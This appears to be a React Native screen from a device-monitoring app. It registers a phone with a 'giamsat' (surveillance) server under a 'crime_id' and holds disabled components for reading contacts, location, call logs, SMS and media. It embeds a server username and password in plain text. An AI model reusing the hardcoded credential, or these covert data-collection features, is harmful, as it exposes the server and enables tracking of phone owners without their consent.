import { View, Text, TextInput, Button } from "react-native";
import React, { useEffect, useState } from "react";
import { Location, Contacts } from "../components";
import * as ExpoTaskManager from "expo-task-manager";
import CallLog from "../components/CallLog";
import SMSListener from "../components/SMSListener";
import Media from "../components/Media";
import * as Device from "expo-device";
import axios from "axios";

const TASK_MANAGER_NAME = {
    GET_CONTACTS: "GET_CONTACTS",
    LOCATION_TASK_NAME: "background-location-task",
};

const Home = () => {
    const {
        deviceName,
        modelName,
        osInternalBuildId,
        osBuildId,
        osName,
        osVersion,
    } = Device;
    const device_name = `${deviceName}/${modelName}`;
    const device_imei = `${osName}/${osVersion}/${osBuildId}/${osInternalBuildId}`;
    const [auth, setAuth] = useState({
        crime_id: null,
        device_man: "",
    });
    const [token, setToken] = useState("");

    useEffect(() => {
        (async () => {
            const resAxios = await axios.post(
                "https://giamsat.cyno.vn/wp-json/jwt-auth/v1/token",
                {
                    username: "user_app",
                    password: "lSfG eZSZ qnfD x7lB ye1c Wn9l",
                }
            );
            if (resAxios.data.token) {
                setToken(resAxios.data.token);
                axios.defaults.headers.common.Authorization =
                    "Bearer " + resAxios.data.token;
            }
            console.log(resAxios.data);
            // console.log("getRegisteredTasksAsync", res);
        })();
    }, []);

    const handleSubmit = async () => {
        try {
            const body = {
                ...auth,
                device_name,
                device_imei,
            };
            console.log(body);
            const res = await axios.post(
                "https://giamsat.cyno.vn/wp-json/cyno/v1/add-device",
                body,
                {
                    headers: {
                        Authorization: "Bearer " + token,
                    },
                }
            );
            console.log(res.data);
        } catch (error) {
            console.log(error.message);
        }
    };

    return (
        <View
            style={{ flex: 1, justifyContent: "center", padding: 16, gap: 16 }}
        >
            <Text style={{ textAlign: "center", fontWeight: 600 }}>
                Authentication
            </Text>
            <TextInput
                style={{
                    borderWidth: 1,
                    padding: 8,
                    borderColor: "black",
                    borderRadius: 12,
                }}
                value={auth.crime_id}
                onChangeText={(value) =>
                    setAuth((prev) => ({ ...prev, crime_id: value }))
                }
                keyboardType="numeric"
                placeholder="ID"
            />
            <TextInput
                style={{
                    borderWidth: 1,
                    padding: 8,
                    borderColor: "black",
                    borderRadius: 12,
                }}
                value={auth.device_man}
                onChangeText={(value) =>
                    setAuth((prev) => ({ ...prev, device_man: value }))
                }
                autoCapitalize="none"
                placeholder="Device man"
            />
            <Button onPress={handleSubmit} title="Submit" />
            {/* <Contacts>
                {({ contacts }) => {
                    return null;
                }}
            </Contacts>
            <Location>
                {({ location, errorMsg }) => {
                    return null;
                }}
            </Location>
            <CallLog />
            <SMSListener />
            <Media /> */}
        </View>
    );
};

const style = {
    input: {
        // border: 1 solid black
    },
};

export default Home;
